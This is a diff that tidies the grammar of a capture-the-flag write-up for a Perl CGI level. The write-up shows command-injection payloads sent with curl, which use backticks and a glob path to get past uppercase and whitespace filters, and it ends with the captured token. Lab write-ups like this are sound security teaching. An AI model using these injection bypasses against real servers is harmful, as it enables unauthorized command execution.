@@ -2,7 +2,7 @@
 
 ---
 
-This level is similar to the previous level except that now the server is `.pl` file.
+This level is similar to the previous level, except that now the server is a `.pl` file.
 
 ```perl
 #!/usr/bin/env perl
@@ -36,17 +36,17 @@ sub n {
 n(t(param("x"), param("y")));
 ```
 
-I can see a shell command executed so I can use a command injection to run `getflag`.
+I can see a shell command executed, so I can use a command injection to run `getflag`.
 
-The only problem of this level is those two lines :
+The only problem with this level is these two lines:
 ```
 $xx =~ tr/a-z/A-Z/;
 $xx =~ s/\s.*//;
 ```
 
-Because before to execute the command, the perl program removes every spaces from the variable and changes every lowercases to uppercases.
+Before executing the command, the Perl program removes every space from the variable and changes every lowercase to uppercase.
 
-So I cannot just write : ```curl 'localhost:4646?x=`getflag > > /tmp/flag`&y=empty'```. Instead I must create a shell script then run it inside the perl executable.
+So I cannot just write: ```curl 'localhost:4646?x=`getflag > > /tmp/flag`&y=empty'```. Instead, I must create a shell script and then run it inside the Perl executable.
 
 ```shell
 $ vi /tmp/GETFLAG
@@ -58,7 +58,7 @@ $ cat /tmp/flag
 cat: /tmp/flag: No such file or directory
 ```
 
-This does not work because the env variable has been set only for me not for the server.
+This does not work because the environment variable has been set only for me, not for the server.
 
 ```shell
 $ vi /tmp/GETFLAG
@@ -66,5 +66,5 @@ $ vi /tmp/GETFLAG
 getflag > /tmp/flag
 $ curl 'localhost:4646?x=`/*/GETFLAG`&y=empty'
 $ cat /tmp/flag
-Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+Check flag. Here is your token: g1qKMiRpXf53AWhDaU7FEkczr
 ```
